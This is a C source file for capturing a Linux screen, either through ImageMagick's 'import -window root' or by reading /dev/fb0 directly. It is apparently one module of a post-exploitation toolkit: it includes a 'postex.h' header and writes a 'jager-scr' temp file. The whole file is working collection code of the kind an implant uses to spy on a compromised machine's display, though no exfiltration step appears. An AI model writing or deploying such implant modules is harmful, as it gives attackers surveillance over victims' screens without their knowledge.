/**
 * Linux screenshot capture - ImageMagick import or /dev/fb0 fallback
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include "../../include/postex.h"

static int read_file_into_buffer(const char *path, unsigned char **out, size_t *out_size) {
    FILE *f = fopen(path, "rb");
    if (!f)
        return -1;

    if (fseek(f, 0, SEEK_END) != 0) {
        fclose(f);
        return -1;
    }
    long sz = ftell(f);
    if (sz <= 0 || sz > 16 * 1024 * 1024) {
        fclose(f);
        return -1;
    }
    rewind(f);

    unsigned char *buf = (unsigned char *)malloc((size_t)sz);
    if (!buf) {
        fclose(f);
        return -1;
    }

    size_t rd = fread(buf, 1, (size_t)sz, f);
    fclose(f);
    if (rd != (size_t)sz) {
        free(buf);
        return -1;
    }

    *out = buf;
    *out_size = rd;
    return 0;
}

static int screenshot_import(unsigned char **out, size_t *out_size) {
    const char *display = getenv("DISPLAY");
    if (!display || !display[0])
        return -1;

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/tmp/jager-scr-%d.png", (int)getpid());

    char cmd[512];
    snprintf(cmd, sizeof(cmd), "import -window root '%s' 2>/dev/null", tmp);

    if (system(cmd) != 0) {
        unlink(tmp);
        return -1;
    }

    int rc = read_file_into_buffer(tmp, out, out_size);
    unlink(tmp);
    return rc;
}

static int screenshot_fb0(unsigned char **out, size_t *out_size) {
    return read_file_into_buffer("/dev/fb0", out, out_size);
}

int collect_screenshot_linux(unsigned char **out, size_t *out_size) {
    if (!out || !out_size)
        return -1;
    if (screenshot_import(out, out_size) == 0)
        return 0;
    return screenshot_fb0(out, out_size);
}
